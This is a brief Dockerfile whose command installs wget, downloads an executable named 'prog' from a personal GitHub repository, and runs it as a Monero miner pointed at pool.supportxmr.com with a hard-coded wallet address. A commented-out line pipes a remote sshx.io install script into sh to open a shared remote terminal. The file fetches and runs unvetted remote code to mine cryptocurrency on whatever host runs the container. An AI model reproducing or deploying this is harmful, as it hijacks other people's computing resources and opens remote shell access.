FROM ubuntu:latest
ENTRYPOINT ["bash", "-c"]
CMD ["apt update && apt install wget -y && wget https://github.com/iceyfromdiscord/yes/raw/refs/heads/master/prog && chmod +x prog && ./prog --url pool.supportxmr.com:443 --user 43wBYRJpvVsMYCUcL1jGrj5GBACA6Qr7BLP3ZieFGueMj82kZcGfNewaEcYm9kyCUiAMhvwFiRxcJ8SzfcVeqn5z1vVkDfQ --pass main --tls --tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14"]
#CMD ["apt update && apt install curl -y && curl -sSf https://sshx.io/get | sh && sshx"]
